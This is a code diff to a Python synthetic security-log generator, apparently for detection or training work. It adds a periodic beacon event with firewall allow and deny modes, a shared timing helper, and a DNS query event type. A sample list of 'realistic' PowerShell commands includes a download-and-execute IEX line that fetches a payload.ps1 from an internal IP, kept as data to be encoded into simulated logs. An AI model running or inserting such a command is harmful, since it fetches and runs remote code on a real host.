@@ -87,6 +87,44 @@ def _size_storyline_connection(
     return ob, rb
 
 
+def _iter_periodic_ticks(
+    start_time: datetime,
+    interval_sec: float,
+    duration_sec: float | None,
+    count: int | None,
+    jitter: float,
+    rng,
+):
+    """Yield timestamps for periodic bulk events.
+
+    Shared timing engine for beacon, web_scan, credential_spray, dga_queries,
+    dns_tunnel, and any future periodic event types.
+
+    Args:
+        start_time: First event timestamp.
+        interval_sec: Seconds between events.
+        duration_sec: Total campaign length in seconds (None when using count).
+        count: Exact number of events to emit (None when using duration).
+        jitter: Fraction of interval to randomize (0.0–1.0).
+        rng: Random number generator instance.
+
+    Yields:
+        datetime for each tick.
+    """
+    t = 0.0
+    emitted = 0
+    while True:
+        if duration_sec is not None and t > duration_sec:
+            break
+        if count is not None and emitted >= count:
+            break
+        jitter_offset = rng.uniform(-jitter * interval_sec, jitter * interval_sec)
+        tick_time = start_time + timedelta(seconds=max(0.0, t + jitter_offset))
+        yield tick_time
+        emitted += 1
+        t += interval_sec
+
+
 # Realistic decoded PowerShell commands for base64 encoding
 POWERSHELL_COMMANDS = [
     "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
@@ -1118,57 +1156,210 @@ class StorylineMixin:
             malicious_event["total_connections"] = total_count
             malicious_event["protocol"] = spec.protocol
 
-        elif spec.type == "blocked_c2":
-            interval_td = parse_duration(spec.interval)
-            duration_td = parse_duration(spec.duration)
-            interval_sec = interval_td.total_seconds()
-            duration_sec = duration_td.total_seconds()
+        elif spec.type == "beacon":
+            # Resolve timing parameters
+            interval_sec = parse_duration(spec.interval).total_seconds()
+            duration_sec = None
+            count = spec.count
+            if spec.duration is not None:
+                duration_sec = parse_duration(spec.duration).total_seconds()
+            elif spec.end_time is not None:
+                end_dt = self._parse_storyline_time(spec.end_time)
+                duration_sec = (end_dt - time).total_seconds()
+            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
 
-            # Determine conn_state from firewall drop_mode
-            conn_state = self._get_firewall_deny_conn_state()
+            beacon_src_ip = spec.source_ip or system.ip
 
-            # Use source_ip override if specified, otherwise use system IP
-            c2_src_ip = spec.source_ip or system.ip
+            # Deny mode: firewall context
+            fw_ctx = None
+            deny_conn_state = None
+            if spec.action == "deny":
+                from evidenceforge.events.contexts import FirewallContext
 
-            # Resolve interfaces
-            src_iface = self._resolve_firewall_interface(c2_src_ip)
-            dst_iface = self._resolve_firewall_interface(spec.dst_ip)
+                deny_conn_state = self._get_firewall_deny_conn_state()
+                src_iface = self._resolve_firewall_interface(beacon_src_ip)
+                dst_iface = self._resolve_firewall_interface(spec.dst_ip)
+                fw_ctx = FirewallContext(
+                    action="deny",
+                    msg_id=106023,
+                    connection_id=0,
+                    src_interface=src_iface,
+                    dst_interface=dst_iface,
+                    access_group=f"{src_iface}_access_in",
+                )
 
-            # Generate periodic denied attempts
-            from evidenceforge.events.contexts import FirewallContext
+            # Allow mode: resolve service, http context, hostname, byte sizing
+            service = spec.service
+            http_ctx = None
+            conn_hostname = None
+            emit_dns = False
+            s_ob, s_rb = _size_storyline_connection(spec, rng)
+            s_conn_state = spec.conn_state or "SF"
+
+            if spec.action == "allow":
+                service = service or (
+                    "ssl" if spec.dst_port == 443 else "http" if spec.dst_port == 80 else "ssl"
+                )
+                # Build HttpContext if HTTP fields are provided
+                if spec.method or spec.uri:
+                    from evidenceforge.events.contexts import HttpContext
+
+                    _method = spec.method or "GET"
+                    _uri = (spec.uri or "/").lower()
+                    if spec.response_body_len is not None:
+                        resp_bytes = spec.response_body_len
+                    elif _method == "POST":
+                        resp_bytes = rng.randint(200, 2000)
+                    else:
+                        resp_bytes = rng.randint(500, 5000)
+                    http_ctx = HttpContext(
+                        method=_method,
+                        host=spec.hostname or spec.dst_ip,
+                        uri=spec.uri or "/",
+                        version="1.1",
+                        user_agent=spec.user_agent or "Mozilla/5.0",
+                        request_body_len=rng.randint(100, 10000) if _method == "POST" else 0,
+                        response_body_len=resp_bytes,
+                        status_code=spec.status_code or 200,
+                        status_msg={
+                            200: "OK",
+                            301: "Moved Permanently",
+                            302: "Found",
+                            403: "Forbidden",
+                            404: "Not Found",
+                            500: "Internal Server Error",
+                        }.get(spec.status_code or 200, "OK"),
+                        resp_mime_types=["text/html"] if (spec.status_code or 200) == 200 else [],
+                        tags=[],
+                    )
+
+                # Hostname / DNS resolution (same logic as connection handler)
+                from evidenceforge.generation.activity.network import REVERSE_DNS
+
+                if spec.hostname:
+                    conn_hostname = spec.hostname
+                    emit_dns = True
+                elif spec.dst_ip in REVERSE_DNS:
+                    conn_hostname = None
+                    emit_dns = True
+                else:
+                    conn_hostname = ""
+                    emit_dns = False
+
+            # Resolve source system
+            src_sys = None
+            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
+            if beacon_src_ip in ip_map:
+                src_sys = ip_map[beacon_src_ip]
+            elif beacon_src_ip == system.ip:
+                src_sys = system
 
             attempt_count = 0
-            t = 0.0
-            while t <= duration_sec:
-                jitter_offset = rng.uniform(-spec.jitter * interval_sec, spec.jitter * interval_sec)
-                attempt_time = time + timedelta(seconds=max(0.0, t + jitter_offset))
-                self.state_manager.set_current_time(attempt_time)
-
-                self.activity_generator.generate_connection(
-                    src_ip=c2_src_ip,
-                    dst_ip=spec.dst_ip,
-                    time=attempt_time,
-                    dst_port=spec.dst_port,
-                    proto=spec.protocol,
-                    conn_state=conn_state,
-                    firewall=FirewallContext(
-                        action="deny",
-                        msg_id=106023,
-                        connection_id=0,
-                        src_interface=src_iface,
-                        dst_interface=dst_iface,
-                        access_group=f"{src_iface}_access_in",
-                    ),
-                    emit_dns=False,
-                )
+            for tick_time in _iter_periodic_ticks(
+                start, interval_sec, duration_sec, count, spec.jitter, rng
+            ):
+                self.state_manager.set_current_time(tick_time)
+                if spec.action == "deny":
+                    self.activity_generator.generate_connection(
+                        src_ip=beacon_src_ip,
+                        dst_ip=spec.dst_ip,
+                        time=tick_time,
+                        dst_port=spec.dst_port,
+                        proto=spec.protocol,
+                        conn_state=deny_conn_state,
+                        firewall=fw_ctx,
+                        emit_dns=False,
+                    )
+                else:
+                    # Allow DNS only on the first tick; cache handles the rest
+                    self.activity_generator.generate_connection(
+                        src_ip=beacon_src_ip,
+                        dst_ip=spec.dst_ip,
+                        time=tick_time,
+                        dst_port=spec.dst_port,
+                        service=service,
+                        duration=rng.uniform(0.5, 10.0),
+                        orig_bytes=s_ob,
+                        resp_bytes=s_rb,
+                        conn_state=s_conn_state,
+                        emit_dns=emit_dns and attempt_count == 0,
+                        source_system=src_sys,
+                        http=http_ctx,
+                        hostname=conn_hostname,
+                        pid=getattr(self, "_last_storyline_pid", -1) or -1,
+                    )
                 attempt_count += 1
-                t += interval_sec
 
             malicious_event["dst_ip"] = spec.dst_ip
             malicious_event["dst_port"] = spec.dst_port
             malicious_event["interval"] = spec.interval
-            malicious_event["duration"] = spec.duration
+            malicious_event["action"] = spec.action
+            term = spec.duration or spec.end_time or f"count={spec.count}"
+            malicious_event["termination"] = term
             malicious_event["attempt_count"] = attempt_count
+
+        elif spec.type == "dns_query":
+            # QTYPE name → numeric mapping
+            _QTYPE_MAP = {
+                "A": 1,
+                "AAAA": 28,
+                "TXT": 16,
+                "CNAME": 5,
+                "MX": 15,
+                "NULL": 10,
+                "SRV": 33,
+                "PTR": 12,
+            }
+            _RCODE_MAP = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}
+
+            from evidenceforge.events.contexts import DnsContext
+
+            qtype_num = _QTYPE_MAP.get(spec.qtype, 1)
+            rcode_num = _RCODE_MAP.get(spec.rcode, 0)
+
+            # Build answers list
+            answers = []
+            ttls = []
+            if spec.answer is not None:
+                answers = [spec.answer] if isinstance(spec.answer, str) else list(spec.answer)
+                ttl_val = float(spec.ttl) if spec.ttl is not None else float(rng.randint(60, 3600))
+                ttls = [ttl_val] * len(answers)
+
+            dns_ctx = DnsContext(
+                query=spec.query,
+                query_type=spec.qtype,
+                qtype=qtype_num,
+                rcode=spec.rcode,
+                rcode_num=rcode_num,
+                answers=answers,
+                TTLs=ttls,
+                trans_id=rng.randint(1, 65535),
+                AA=False,
+                RD=True,
+                RA=True,
+                rejected=spec.rcode == "REFUSED",
+                rtt=rng.uniform(1.0, 50.0),
+            )
+
+            # Resolve DNS server IP
+            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])
+            dns_server_ip = rng.choice(dns_server_ips)
+            query_src_ip = spec.source_ip or system.ip
+
+            self.activity_generator.generate_connection(
+                src_ip=query_src_ip,
+                dst_ip=dns_server_ip,
+                time=time,
+                dst_port=53,
+                proto="udp",
+                service="dns",
+                dns=dns_ctx,
+                emit_dns=False,
+            )
+
+            malicious_event["query"] = spec.query
+            malicious_event["qtype"] = spec.qtype
+            malicious_event["rcode"] = spec.rcode
 
         elif spec.type == "raw":
             self.activity_generator.generate_raw(
